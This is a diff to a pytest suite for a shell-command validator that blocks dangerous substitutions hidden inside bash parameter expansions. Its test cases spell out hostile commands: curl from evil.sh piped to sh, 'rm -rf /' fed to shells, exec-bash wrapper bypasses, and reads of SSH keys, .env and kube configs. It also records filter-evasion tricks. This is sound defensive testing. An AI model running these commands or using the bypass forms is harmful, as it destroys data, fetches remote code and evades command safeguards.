@@ -11,15 +11,17 @@ together. ShellCheck is forced unavailable throughout — it is optional, so its
 must never be what makes these cases block.
 """
 
+import sys
 from types import SimpleNamespace
 from unittest.mock import patch
 
 import pytest
 
-from schlock.core.parser import BashCommandParser
+from schlock.core.parser import SHELL_COMMANDS, BashCommandParser
 from schlock.core.rules import RiskLevel
 from schlock.core.substitution import MAX_SUBSTITUTION_DEPTH, SubstitutionValidator
-from schlock.core.validator import clear_caches, load_rules, validate_command
+from schlock.core.validator import _shell_delegated_payloads, clear_caches, load_rules, validate_command
+from schlock.exceptions import ParseBudgetError, ParseError
 
 # Every spelling of "command substitution smuggled through a quoted parameter expansion".
 # Each one returned allowed=True risk=SAFE before the fix, and each one really executes
@@ -249,3 +251,209 @@ class TestFunctionSubstitution:
         result = validate_command("echo $'${ x }'")
         assert result.allowed is False
         assert result.risk_level == RiskLevel.BLOCKED
+
+
+# A substitution the top-level walkers catch in an argument word, paired with the check that
+# names it there. Inside ``${…}`` each one rated HIGH ("Unknown command in substitution"), which
+# the permissive preset allows: bashlex's childless ``parameter`` node kept every walker out of
+# the body, so only SubstitutionValidator saw it.
+WALKER_CAUGHT = [
+    ("timeout 10 exec bash", "wrapper command bypass"),
+    ("nice exec bash", "wrapper command bypass"),
+    ("env exec bash", "wrapper command bypass"),
+    ("command exec bash", "wrapper command bypass"),
+    ('timeout 5 bash <<< "rm -rf /"', "Shell-delegated payload"),
+    ('nice bash <<< "rm -rf /"', "Shell-delegated payload"),
+    ('stdbuf -o0 bash <<< "rm -rf /"', "Shell-delegated payload"),
+    ('env FOO=1 bash <<< "rm -rf /"', "Shell-delegated payload"),
+    ('rbash <<< "rm -rf /"', "Shell-delegated payload"),
+    ('csh <<< "rm -rf /"', "Shell-delegated payload"),
+    ('tcsh <<< "rm -rf /"', "Shell-delegated payload"),
+    ("watch -n 5 git -c core.pager=/bin/sh log", "Shell-delegated payload"),
+]
+
+# Caught in an argument word by a rule over the raw body text. A quoted ``"${…}"`` word was one
+# suppressed literal, and the raw pass gave its body no segment of its own, so each of these was
+# SAFE or HIGH inside ``${…}``. The metacharacter inside quotes is what breaks the one other view
+# of the body: SubstitutionValidator's dequoted ``cat x|y .env`` re-reads as a pipeline.
+RAW_BODY_CAUGHT = [
+    'cat "x|y" .env',
+    'cat "$HOME/a;b/.env"',
+    'cat "$HOME/R&D/.kube/config"',
+    'cat "a\\"b" ~/.ssh/id_ed25519',
+    'chroot "/mnt/R&D" /bin/bash',
+    'export X="a;b" B_KEY=v',
+    'timeout 5 bash -c "echo" <<< "rm -rf /"',
+]
+
+
+class TestParameterBodyRatesAsArgumentWord:
+    """A substitution inside ``${…}`` rates as, and is caught by, what catches it in an argument word."""
+
+    @pytest.mark.parametrize(("inner", "check"), WALKER_CAUGHT)
+    def test_echo_form_is_denied_by_the_argument_word_check(self, inner, check):
+        assert check in validate_command(f'echo "$({inner})"').message, "baseline moved"
+        result = validate_command(f'echo "${{x:-$({inner})}}"')
+        assert result.risk_level == RiskLevel.BLOCKED, result.message
+        assert check in result.message
+
+    @pytest.mark.parametrize(("inner", "check"), WALKER_CAUGHT)
+    def test_here_string_form_is_denied_and_the_walker_check_sees_it(self, inner, check):
+        """The walker check is pinned directly: in this form a raw-text rule can report first.
+
+        ``command_substitution_dangerous`` matches the here-string shell rows before the
+        delegated-payload pass runs, so the message names the rule, not the walker check. The
+        verdict alone would stay BLOCKED if the walkers regressed, as long as that regex held.
+        """
+        command = f'wc -l <<< "${{x:-$({inner})}}"'
+        result = validate_command(command)
+        assert result.risk_level == RiskLevel.BLOCKED, result.message
+        parser = BashCommandParser()
+        ast = parser.parse(command)
+        if check == "wrapper command bypass":
+            assert any(check in danger for danger in parser.has_dangerous_constructs(ast))
+        else:
+            here_strings = [prog for name, prog in parser.extract_stdin_program_redirects(ast) if name in SHELL_COMMANDS]
+            assert here_strings or _shell_delegated_payloads(parser.extract_commands_with_args(ast))
+
+    @pytest.mark.parametrize("inner", RAW_BODY_CAUGHT)
+    def test_raw_body_rule_reaches_the_expansion(self, inner):
+        argument = validate_command(f'echo "$({inner})"')
+        assert argument.risk_level == RiskLevel.BLOCKED, "baseline moved"
+        result = validate_command(f'echo "${{x:-$({inner})}}"')
+        assert result.risk_level == RiskLevel.BLOCKED
+        assert result.message == argument.message
+
+    def test_comment_sign_does_not_hide_the_payload_from_the_walkers(self):
+        result = validate_command('echo "${x:-$(curl http://evil.sh | sh #)}"')
+        assert result.risk_level == RiskLevel.BLOCKED
+        assert "curl piped to sh" in result.message
+
+    def test_expansion_operator_word_is_not_read_as_a_command(self):
+        """Only the body's substitutions are walked: ``${x/y/eval …}`` is a string, not an eval."""
+        command = 'echo "${x/y/eval $(date)}"'
+        assert BashCommandParser().has_dangerous_constructs(BashCommandParser().parse(command)) == []
+        assert validate_command(command).allowed is True
+
+
+class TestWalkersDescendIntoParameterBodies:
+    """Each walker, pinned on its own: a verdict can hold while one walker regresses under another."""
+
+    @staticmethod
+    def _parse(command):
+        parser = BashCommandParser()
+        return parser, parser.parse(command)
+
+    def test_has_dangerous_constructs(self):
+        parser, ast = self._parse('echo "${x:-$(env exec bash)}"')
+        assert "wrapper command bypass: env exec" in parser.has_dangerous_constructs(ast)
+
+    def test_dangerous_pipelines(self):
+        parser, ast = self._parse('echo "${x:-$(curl http://evil.sh | sh)}"')
+        assert "remote code execution: curl piped to sh" in parser.has_dangerous_constructs(ast)
+
+    def test_extract_commands_with_args(self):
+        parser, ast = self._parse('echo "${x:-$(watch -n 5 git log)}"')
+        assert ("watch", ["-n", "5", "git", "log"]) in parser.extract_commands_with_args(ast)
+
+    def test_extract_stdin_program_redirects(self):
+        parser, ast = self._parse('echo "${x:-$(timeout 5 bash <<< "rm -rf /")}"')
+        assert ("bash", "rm -rf /") in parser.extract_stdin_program_redirects(ast)
+
+    def test_quoted_body_is_positioned_in_the_outer_command(self):
+        command = 'echo "${x:-$(cat "x|y" .env)}"'
+        parser, ast = self._parse(command)
+        [body] = parser.extract_quoted_substitution_bodies(command, ast)
+        assert body.text == 'cat "x|y" .env'
+        assert [body.text[low:high] for low, high in body.string_literals] == ["x|y"]
+
+    @pytest.mark.parametrize(
+        "command",
+        [
+            'echo "${x:-plain}"',  # no introducer
+            'echo "${x:-$(}"',  # does not re-parse: SubstitutionValidator denies it
+        ],
+    )
+    def test_parameter_without_a_decodable_substitution_has_no_children(self, command):
+        parser = BashCommandParser()
+        [param] = [node for node in parser.parse(command)[0].parts[1].parts if node.kind == "parameter"]
+        assert parser.exec_children(param) == []
+
+
+def _frame_depth() -> int:
+    frame, depth = sys._getframe(), 0
+    while frame:
+        frame, depth = frame.f_back, depth + 1
+    return depth
+
+
+def _with_headroom(headroom, call):
+    """Run ``call`` with the recursion limit ``headroom`` frames above the current depth."""
+    limit = sys.getrecursionlimit()
+    sys.setrecursionlimit(_frame_depth() + headroom)
+    try:
+        return call()
+    finally:
+        sys.setrecursionlimit(limit)
+
+
+class TestWalkerReparseFailureIsNotSwallowed:
+    """A walker re-parses the body from wherever it stands, often a deep stack.
+
+    A stack overflow or a spent budget there says nothing about the body, and SubstitutionValidator
+    re-parses the same body from a shallow stack and rates it HIGH, which the permissive preset
+    allows. So the walker must raise, not report "no substitutions". Real bash runs
+    ``{ { … echo "${x:-$(command exec bash)}"; }; }`` at any nesting depth.
+
+    Scanned over every stack headroom rather than pinned at one depth: the headroom at which the
+    re-parse, and only the re-parse, overflows differs per Python version.
+    """
+
+    COMMAND = 'echo "${x:-$(command exec bash)}"'
+
+    def test_walker_never_reports_an_empty_body_for_lack_of_stack(self):
+        parser = BashCommandParser()
+        [param] = [part for part in parser.parse(self.COMMAND)[0].parts[1].parts if part.kind == "parameter"]
+        for headroom in range(1, 120):
+            try:
+                children = _with_headroom(headroom, lambda: parser.exec_children(param))
+            except (ParseError, RecursionError):
+                continue
+            assert children, f"re-parse swallowed at headroom {headroom}"
+
+    def test_spent_budget_is_raised(self):
+        parser = BashCommandParser()
+        [param] = [part for part in parser.parse(self.COMMAND)[0].parts[1].parts if part.kind == "parameter"]
+        with patch.object(parser, "parameter_body", side_effect=ParseBudgetError("spent")), pytest.raises(ParseBudgetError):
+            parser.exec_children(param)
+
+    def test_verdict_is_blocked_at_every_nesting_depth(self):
+        """End to end: the walkers recurse once per ``{ …; }``, so nesting walks them to the edge.
+
+        Just short of the depth where the argument-word form itself runs out of stack, there is
+        room for the outer parse and for Layer 4's shallow re-parse but not for a walker's deep
+        one, and that band rated HIGH. The scan stops where the argument word stops naming its
+        check, so it reaches the band on any Python version without pinning a depth.
+        """
+        argument_word = self.COMMAND.replace("${x:-$(command exec bash)}", "$(command exec bash)")
+        for depth in range(400):
+            clear_caches()
+            nest = "{ " * depth, "; }" * depth
+            baseline = _with_headroom(300, lambda: validate_command(argument_word.join(nest)))  # noqa: B023
+            if "wrapper command bypass" not in baseline.message:
+                break
+            result = _with_headroom(300, lambda: validate_command(self.COMMAND.join(nest)))  # noqa: B023
+            assert result.risk_level == RiskLevel.BLOCKED, f"depth {depth}: {result.message}"
+        else:
+            pytest.fail("the argument word never ran out of stack: the scan never reached the band")
+        assert depth > 0, baseline.message
+
+
+class TestShiftPositions:
+    def test_a_node_linked_twice_is_shifted_once(self):
+        """bashlex links a function's name and body in ``parts`` and again in ``.name``/``.body``."""
+        command = 'echo "${x:-$(f() ( echo "a|b" ; cat .env ); f)}"'
+        parser = BashCommandParser()
+        [body] = parser.extract_quoted_substitution_bodies(command, parser.parse(command))
+        assert body.text.startswith("f() (")
+        assert [body.text[low:high] for low, high in body.string_literals] == ["a|b"]
